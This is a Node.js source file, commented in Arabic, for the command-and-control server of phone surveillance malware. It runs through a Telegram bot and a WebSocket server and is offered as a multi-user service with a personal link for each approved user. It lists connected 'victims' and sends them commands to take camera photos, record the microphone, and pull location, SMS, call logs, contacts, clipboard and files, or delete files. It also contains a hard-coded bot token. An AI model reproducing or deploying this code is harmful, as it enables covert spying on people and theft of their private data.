const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid").v4;

// --- الإعدادات الأساسية للهوية ---
const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
const ADMIN_ID = 6568145373; 
const BASE_URL = "https://labeb.onrender.com"; 

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });

let clients = [];
let allowedUsers = [ADMIN_ID]; 
let pendingRequests = new Set(); // لمنع تكرار طلبات الانتظار

// --- لوحة التحكم المركزية ---
bot.on("message", async (msg) => {
    const id = msg.chat.id;
    const text = msg.text;

    // 1. نظام التحقق ومنع السبام (الإزعاج)
    if (!allowedUsers.includes(id)) {
        if (pendingRequests.has(id)) {
            return bot.sendMessage(id, "⏳ <b>هدئ من روعك..</b>\nطلبك قيد المراجعة بالفعل، انتظر موافقة المطور.");
        }
        
        pendingRequests.add(id);
        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب استخدام جديد:</b>\n👤 الاسم: ${msg.from.first_name}\n🆔 المعرف: <code>${id}</code>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[{ text: "✅ تفعيل الآن", callback_data: `allow_${id}` }]]
            }
        });
        return bot.sendMessage(id, "⏳ <b>أهلاً بك..</b>\nتم إرسال طلبك للمطور @A_l_k_w_r_y. يرجى الانتظار.");
    }

    // 2. لوحة الإمبراطور (الأدمن)
    if (id === ADMIN_ID && text === "/start") {
        return bot.sendMessage(id, `👑 <b>لوحة تحكم المطور الرئيسي</b>\n\nالضحايا: <code>${clients.length}</code>\nالمستخدمين: <code>${allowedUsers.length - 1}</code>`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ["📱 عرض كافة الضحايا", "👥 المصرح لهم"],
                    ["🚫 طرد مستخدم بالايدي", "🔓 إعفاء مستخدم"],
                    ["📢 إذاعة", "🔄 إعادة تشغيل"]
                ],
                resize_keyboard: true
            }
        });
    }

    // 3. توليد الرابط الخاص للمستخدم المصرح له
    if (text === "/start" && id !== ADMIN_ID) {
        const userLink = `${BASE_URL}/?id=${id}`;
        return bot.sendMessage(id, `💎 <b>تم تفعيل حسابك بنجاح</b>\n\n🔗 <b>رابط الاستضافة الخاص بك:</b>\n<code>${userLink}</code>\n\n⚠️ ضحاياك سيظهرون لك هنا حصراً.`, {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [["📱 ضحاياي"]], resize_keyboard: true }
        });
    }

    // 4. معالجة الطرد والإعفاء (بالايدي)
    if (id === ADMIN_ID && (text === "🚫 طرد مستخدم بالايدي" || text === "🔓 إعفاء مستخدم")) {
        const isExempt = text.includes("إعفاء");
        bot.sendMessage(id, `✍️ أرسل المعرف (ID) الذي تريد ${isExempt ? "إعفاءه" : "طرده"}:`);
        bot.once("message", (m) => {
            const target = parseInt(m.text);
            if (isNaN(target)) return bot.sendMessage(id, "❌ المعرف غير صحيح.");
            
            if (isExempt) {
                if (!allowedUsers.includes(target)) allowedUsers.push(target);
                bot.sendMessage(id, `✅ تم إعفاء وتفعيل <code>${target}</code>`, {parse_mode:'HTML'});
            } else {
                allowedUsers = allowedUsers.filter(u => u !== target);
                bot.sendMessage(id, `✅ تم طرد <code>${target}</code> بنجاح`, {parse_mode:'HTML'});
            }
        });
    }

    // 5. عرض الضحايا
    if (text === "📱 ضحاياي" || text === "📱 عرض كافة الضحايا") {
        const myVictims = (id === ADMIN_ID && text.includes("كافة")) ? clients : clients.filter(c => c.ownerId == id);
        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا توجد أجهزة نشطة.");
        
        myVictims.forEach(c => {
            bot.sendMessage(id, `📍 <b>جهاز:</b> <code>${c.id}</code>\n🌍 IP: <code>${c.ip}</code>`, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🕹️ السيطرة", callback_data: `control_${c.id}` }]] }
            });
        });
    }
});

// --- لوحة التحكم الشفافة (Inline) ---
bot.on("callback_query", (q) => {
    const [action, value] = q.data.split("_");

    if (action === "allow") {
        const target = parseInt(value);
        if (!allowedUsers.includes(target)) allowedUsers.push(target);
        pendingRequests.delete(target);
        bot.sendMessage(target, "✅ <b>مبارك! تم تفعيل حسابك.</b>\nأرسل /start الآن.");
        return bot.editMessageText(`✅ تم تفعيل <code>${target}</code>`, { chat_id: ADMIN_ID, message_id: q.message.message_id, parse_mode: 'HTML' });
    }

    if (action === "control") {
        const victimId = value;
        const buttons = {
            inline_keyboard: [
                [{ text: "📸 سيلفي", callback_data: `selfie_${victimId}` }, { text: "📸 رئيسية", callback_data: `maincam_${victimId}` }],
                [{ text: "🎙️ تسجيل", callback_data: `mic_${victimId}` }, { text: "📍 الموقع", callback_data: `loc_${victimId}` }],
                [{ text: "📩 SMS", callback_data: `msgs_${victimId}` }, { text: "📞 السجل", callback_data: `calls_${victimId}` }],
                [{ text: "👥 الأسماء", callback_data: `contacts_${victimId}` }, { text: "📋 الحافظة", callback_data: `clip_${victimId}` }],
                [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }]
            ]
        };
        bot.sendMessage(q.message.chat.id, `🕹️ <b>التحكم:</b> <code>${victimId}</code>`, { parse_mode: 'HTML', reply_markup: buttons });
    }

    const target = clients.find(c => c.id === value);
    if (target && !["allow", "control"].includes(action)) {
        target.ws.send(JSON.stringify({ cmd: action }));
        bot.answerCallbackQuery(q.id, { text: "🚀 جاري التنفيذ" });
    }
});

// --- استقبال الضحايا ---
wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const ownerId = urlParams.get('id') || ADMIN_ID; 

    const deviceId = uuid4().substring(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    clients.push({ id: deviceId, ws: ws, ip: ip, ownerId: ownerId });
    bot.sendMessage(ownerId, `⚠️ <b>وقع صيد جديد في شباكك! 🔥</b>\n🆔 الجهاز: <code>${deviceId}</code>`, { parse_mode: 'HTML' });

    ws.on('close', () => { clients = clients.filter(c => c.id !== deviceId); });
});

server.listen(process.env.PORT || 3000, () => { console.log("System Online - Multi-User Ready"); });
